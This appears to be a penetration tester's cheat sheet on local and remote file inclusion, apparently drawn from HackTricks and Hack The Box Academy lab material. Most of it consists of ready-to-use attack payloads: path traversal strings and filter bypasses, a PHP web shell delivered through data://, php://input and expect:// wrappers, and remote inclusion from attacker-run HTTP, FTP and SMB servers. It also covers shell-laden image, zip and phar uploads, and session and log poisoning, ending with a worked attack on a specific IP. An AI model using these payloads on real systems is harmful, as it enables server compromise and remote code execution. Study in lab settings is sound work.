https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo
https://book.hacktricks.xyz/pentesting-web/file-inclusion
# Local File Inclusion (LFI)
```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```
### Examples of Vulnerable Code
#### PHP
```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```
#### NodeJS
```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```
`Express.js` framework `render()` function
```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```
#### Java
```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```
#### .NET
```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

## Basic LFI
```LFI
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```
## Path Traversal
###### PHP `include()` function
```php
include($_GET['language']);
```

```php
include("./languages/" . $_GET['language']);
```
###### Path Traversal Attack
```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```
### Filename Prefix
```php
include("lang_" . $_GET['language']);
```
###### Path Traversal Attack
```
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
```
### Appended Extensions
```php
include($_GET['language'] . ".php");
```
### Second-Order Attacks
`/profile/$username/avatar.png`
If we craft a malicious LFI username (e.g. `../../../etc/passwd`), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.
# Basic Bypasses
### Non-Recursive Path Traversal Filters
```php
$language = str_replace('../', '', $_GET['language']);
```
###### Bypass Filters
`....//`
`..././`
`....\/`
`....////`
###### Path Traversal Attack
```
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```
## Encoding
![[lfi-config-wrapper.png]]
`double encoded` To bypass more
###### Path Traversal Attack
```
<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```
## Approved Paths
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
###### Path Traversal Attack
```
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```
## Appended Extension
#### Path Truncation
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
#### Null Bytes
`/etc/passwd%00.php`
# PHP Filters
## Input Filters
`php://filter/`
[String Filters](https://www.php.net/manual/en/filters.string.php)
[Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
[Compression Filters](https://www.php.net/manual/en/filters.compression.php)
[Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
## Fuzzing for PHP Files
```ffuf
ffuf -w /home/kali/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```
## Standard PHP Inclusion
```
http://<SERVER_IP>:<PORT>/index.php?language=config
```
## Source Code Disclosure
```url
php://filter/read=convert.base64-encode/resource=config
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
![](https://academy.hackthebox.com/storage/modules/23/lfi_config_wrapper.png)

```decode
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```
# PHP Wrappers
## Data
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.
#### Checking PHP Configurations
**Apache**
`/etc/php/X.Y/apache2/php.ini`
**Nginx**
`/etc/php/X.Y/fpm/php.ini`

```curl
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
## Remote Code Execution
`allow_url_include` enabled
###### Encode PHP Web Shell
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```
`Note: Must be URL Encode`
##### LFI Attack
`data://text/plain;base64,`
```LFI
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<encoded-php-web-shell>&cmd=id
```
###### Curl
```curl
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<encoded-php-web-shell>&cmd=id' | grep uid
```
###### List Directories
```curl
curl -s 'http://STMIP:STMPO/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"
```
## Input
`allow_url_include` enabled
The [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code.
```curl
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
## Expect
The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams.
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```
`extension=expect`

```curl
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

# Remote File Inclusion (RFI)
[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)
## Verify RFI
```RFI
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
`allow_url_include = On`
###### Example Attack
```RFI
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```
## Remote Code Execution with RFI
##### shell.php
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
##### HTTP
```py
sudo python3 -m http.server <LISTENING_PORT>
```
##### RCE
```rce
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/shell.php&cmd=id
```
## FTP RCE
###### FTP
```FTP
sudo python -m pyftpdlib -p 21
```
###### RCE
```rce
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```
###### CURL
```curl
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```
## SMB
`allow_url_include` disabled or enabled
```SMB
impacket-smbserver -smb2support share $(pwd)
```
###### RCE
```rce
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```
# LFI and File Uploads
## Image upload
#### Crafting Malicious Image
##### GIF
```shell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
#### Uploaded File Path
```rce
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```
## Zip Upload
We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code.
###### Web Shell
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
###### RCE
```rce
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
## Phar Upload
##### shell.php
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
###### Web Shell
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
###### RCE
```rce
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```
# Log Poisoning
## PHP Session Poisoning
###### **Windows**
`C:\Windows\Temp\`
###### **Linux**
`/var/lib/php/sessions`
`/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`
###### Session LFI Vulnerability
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
![[lfi-session-vulnerability.png]]
###### ?language=session_poisoning
```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
###### Check session_poisoning
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
![[lfi-session-poisoning.png]]
##### Writing Web Shell
###### URL Encode
```bash
urlencode '<?php system($_GET["cmd"]); ?>'
```
###### Inject Web Shell
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
###### RCE
```rce
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
## Server Log Poisoning
Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`.
As we can control the `User-Agent` header in our requests, we can use it to poison the server logs.
##### Apache logs
###### Linux
`/var/log/apache2/access.log`
###### Windows
`C:\xampp\apache\logs\access.log`
##### Nginx logs
###### Linux
`/var/log/nginx/access.log`
###### Windows
`C:\nginx\log\access.log`
##### /var/log/apache2/access.log
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```
![[lfi-access.log.png]]
The log contains the `remote IP address`, `request page`, `response code`, and the `User-Agent` header.
The `User-Agent` header is controlled by us through the HTTP request headers, so we should be able to poison this value.
#### RCE
###### Inject RCE Payload
![[server-poisoning-rce.png]]
###### Curl
```curl
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```
###### Execute RCE
![[access.log-rce.png]]
#### Other Service Logs
`/var/log/sshd.log`
`/var/log/mail`
`/var/log/vsftpd.log`
# Automated Scanning
## Fuzzing Parameters
```ffuf
ffuf -w /home/kali/Desktop/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
## LFI wordlists
There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. 
A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt).
```ffuf
ffuf -w /home/kali/Desktop/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```
## Fuzzing Server Files
#### Server Webroot
[Wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
[Wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).
```ffuf
ffuf -w /home/kali/Desktop/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```
#### Server Logs/Configurations
```ffuf
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```
## LFI Tools
[LFISuite](https://github.com/D35m0nd142/LFISuite)
[LFiFreak](https://github.com/OsandaMalith/LFiFreak)
[liffy](https://github.com/mzfr/liffy)
# File Inclusion Prevention
## SSH
User: htb-student
Password: HTB_@cademy_stdnt!
```ssh
ssh htb-student@<IP>
```
###### Modify Apache php.ini
`/etc/php/7.4/apache2/php.ini`
```ssh
sudo vim /etc/php/7.4/apache2/php.ini
```
###### **Replace**
```apache2
disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```
###### Restart Apache
```ssh
sudo service apache2 restart
```
###### Root Privilege
```ssh
sudo su -
```
###### Inject RCE
```ssh
echo "<?php system('id'); ?>" > /var/www/html/shell.php
```
###### Error.log
```ssh
sudo tail -f /var/log/apache2/error.log
```
###### HTTP Browser
```url
http://STMIP/shell.php
```

# **Examples**

###### First check web servers
```curl
curl -i -X GET http://94.237.57.183:51420/
```
###### Read Source Code
```url
php://filter/read=convert.base64-encode/resource=index
```
###### Read Source Code
```url
php://filter/read=convert.base64-encode/resource=admin/index
```
###### Path Traversal 
```path-traversal
http://94.237.57.183:51420/admin/index.php?log=../../../../../var/log/<webserver>/access.log
```
###### Test User-Agent
```curl
curl -s "http://94.237.57.183:51420/admin/index.php?log=../../../../../var/log/nginx/access.log" -A "LOG POISONING" | grep "LOG POISONING"
```
###### RCE
```curl
curl -s "http://94.237.57.183:51420/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id"
```

